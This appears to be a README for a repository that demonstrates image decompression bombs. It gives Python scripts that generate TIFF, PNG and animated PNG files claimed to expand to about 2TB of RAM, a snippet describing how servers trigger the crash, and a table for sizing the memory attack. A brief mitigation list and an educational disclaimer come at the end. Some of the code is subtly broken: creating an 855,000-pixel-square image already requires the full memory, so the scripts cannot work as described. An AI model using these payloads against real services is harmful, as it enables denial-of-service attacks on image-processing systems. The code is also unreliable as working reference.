
# 🧨 Image Decompression Bombs in Python

This repository demonstrates how to create **image decompression bombs** using Python in formats:
- TIFF
- PNG
- APNG (Animated PNG)

These bombs are designed to be **tiny on disk** but expand to consume **massive RAM** (up to 2TB+) when opened, often causing memory exhaustion or crashes in image-processing systems.

> ⚠️ **For educational and research purposes only!** Do not deploy these files in production or upload to services without explicit permission.

---

## 📦 How It Works

Image formats like PNG and TIFF use lossless compression. You can craft images that look small (e.g., 1MB), but when decompressed occupy hundreds of GBs or more in memory.

### ✅ Strategy:
- Use solid-color pixels (e.g., white)
- Extreme resolution (e.g., 855,000×855,000)
- Save with maximum compression (`compress_level=9`, `tiff_deflate`)
- Optional: Use formats with multiple frames (e.g., APNG)

---

## 🧰 Requirements

Install dependencies:

```bash
pip install pillow apng
```

---

## 💣 Create a 2TB TIFF Bomb

```python
from PIL import Image, TiffImagePlugin

width = height = 855000
img = Image.new('RGB', (width, height), color='white')

img.save(
    'tiff_bomb_2tb.tiff',
    compression='tiff_deflate',
    tiffinfo={TiffImagePlugin.STRIPOFFSETS: (1,)}
)
```

---

## 💣 Create a 2TB PNG Bomb

```python
from PIL import Image

width = height = 855000
img = Image.new('RGB', (width, height), color='white')
img.save('png_bomb_2tb.png', compress_level=9)
```

---

## 🌀 Create an APNG Bomb (Multi-frame)

```python
from apng import APNG
from PIL import Image
import os

frames = 10
width = height = 150000
frame_paths = []

for i in range(frames):
    frame = Image.new('RGB', (width, height), color='white')
    path = f'frame_{i}.png'
    frame.save(path, compress_level=9, optimize=True)
    frame_paths.append(path)

apng = APNG()
for path in frame_paths:
    apng.append_file(path, delay=100)
apng.save("apng_bomb.png")

for path in frame_paths:
    os.remove(path)
```

---

## 🧪 Auto-Decompression (Server-Side Trigger)

Servers that auto-process uploads (e.g., preview thumbnails, resizing) will often **trigger decompression automatically**, leading to crash:

```python
from PIL import Image

img = Image.open("png_bomb_2tb.png")
img.load()
```

---

## 📊 Safe Size Reference Table

| RAM Target | Approx Dimensions | Uncompressed RAM |
|------------|-------------------|------------------|
| 100MB      | 5912 x 5912       | 0.10 GB          |
| 200MB      | 8360 x 8360       | 0.20 GB          |
| 400MB      | 11824 x 11824     | 0.39 GB          |
| 800MB      | 16721 x 16721     | 0.78 GB          |
| 1.6GB      | 23930 x 23930     | 1.60 GB          |
| 3.2GB      | 33839 x 33839     | 3.20 GB          |
| 6.4GB      | 47871 x 47871     | 6.40 GB          |
| 12.8GB     | 67679 x 67679     | 12.80 GB         |
| 25.6GB     | 95700 x 95700     | 25.60 GB         |
| 51.2GB     | 135402 x 135402   | 51.20 GB         |
| 96.0GB     | 180598 x 180598   | 96.00 GB         |
| 1.0TB+     | 605396 x 605396   | ~1.0 TB          |
| 2.0TB+     | 855000 x 855000   | ~2.0 TB          |

---

## 🔒 Mitigation Strategies

- Check resolution: `if img.width * img.height > X`
- Limit file uploads by pixel count
- Open files in sandboxed environments
- Disable thumbnail generation for untrusted images

---

## 🧠 Educational Use Only

These examples are meant to raise awareness of hidden attack vectors in media processing. Use responsibly.
Pablo Guide / Pablo Rotem / פבלו רותם

---

## 📄 License

MIT License
